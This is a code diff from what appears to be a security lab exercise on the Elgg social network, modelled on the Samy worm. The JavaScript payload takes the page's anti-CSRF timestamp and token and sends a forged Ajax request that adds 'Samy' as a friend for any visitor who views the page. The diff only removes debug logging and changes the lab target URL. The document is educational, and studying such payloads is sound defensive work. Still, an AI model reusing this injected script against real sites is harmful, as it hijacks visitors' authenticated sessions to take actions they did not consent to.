@@ -5,11 +5,10 @@ window.onload = function() {
     // Set the timestamp and secret token parameters
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
-    this.console.log("ts", ts);
-    this.console.log("token", token);
+    
 
     //Construct the HTTP request to add Samy as a friend.
-    var sendurl = `http://www.csrflabelgg.com/action/friends/add?friend=45${ts}${token}`;
+    var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token;
 
     //Create and send Ajax request to add friend
     Ajax = new XMLHttpRequest();
